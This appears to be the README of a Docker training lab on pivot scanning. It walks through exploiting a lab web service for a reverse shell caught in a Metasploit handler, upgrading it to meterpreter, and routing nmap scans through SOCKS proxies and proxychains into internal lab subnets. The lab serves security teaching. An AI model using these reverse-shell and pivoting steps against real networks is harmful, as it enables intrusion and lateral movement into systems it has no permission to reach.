# Pivot Scanning Exercise

This is an exercise to teach attackers the art of pivot scanning.
It starts with a simple revershell into meterpreter into nmap into SOCKS proxy.

## Setup

1. Run `docker compose up --build` to start the exercise.

## Walkthrough

1. Scan the host that runs the exercise, discover port 80.
1. Checkout port 80 and find Python As A Service. If the students were defenders before, they should know this service from the monitoring exercise.
1. Exploit service to get reverse shell. Ideally, they'll catch the reverse shell with netcat first, we'll show them metasploit.
    
    ```msfconsole
    use exploit/multi/handler
    set lhost IP_ADDRESS
    run
    # start rev shell
    ```

1. Upgrade shell to meterpreter:

    ```msfconsole
    # CTRL+Z to for background
    use post/multi/manage/shell_to_meterpreter
    set session 1
    run
    ```

1. How to continue? -> We want to enumerate. But we also want to enumerate network services. But we don't have `nmap` :( Wouldn't it be great, if we could route our traffic through our existing connection?
1. SOCKS Proxy allows us to proxy Transport Layer traffic.
1. Start SOCKS Proxy in Metasploit:

    ```msfconsole
    use auxiliary/server/socks_proxy
    run
    ```

1. Let msfconsole route traffic

    ```msfconsole
    use post/multi/manage/autoroute
    set session 2
    run
    ```

1. Configure Proxychains

    ```conf
    # proxychains.conf  VER 4.x

    strict_chain
    proxy_dns
    remote_dns_subnet 224

    # Some timeouts in milliseconds
    tcp_read_time_out 15000
    tcp_connect_time_out 8000

    [ProxyList]
    socks5 127.0.0.1 1080
    ```

1. You can now start programs with proxychains like `proxychains curl 172.20.0.2`. You can also configure FoxyProxy in Firefox to connect to the local proxy.
1. Start a scan with `proxychains nmap -T4 -Pn -sT -p22,80,443 172.20.0.0/24`.
1. Find `172.20.0.5` and `172.20.0.44`. Open `172.20.0.5` in the browser and find the greeters page.
1. Find `172.20.0.44` with open SOCKS port by scanning for `1080`.
1. Add `socks5 172.20.0.44 1080` to the `proxychains.conf` file. At `172.20.1.5` the greeter should be visible again.
1. Then, you can start scanning the next network and find the final page at `172.20.1.200`.
1. In case you want to use FoxyProxy with these two proxies, run `proxychains msfconsole` and `use auxiliary/server/socks_proxy`, configure a port other than `1080` and execute `run`.
1. Then you can connect with FoxyProxy to the new SOCKS proxy (that is present in `msconsole`, which runs in the `proxychains` with two proxies).
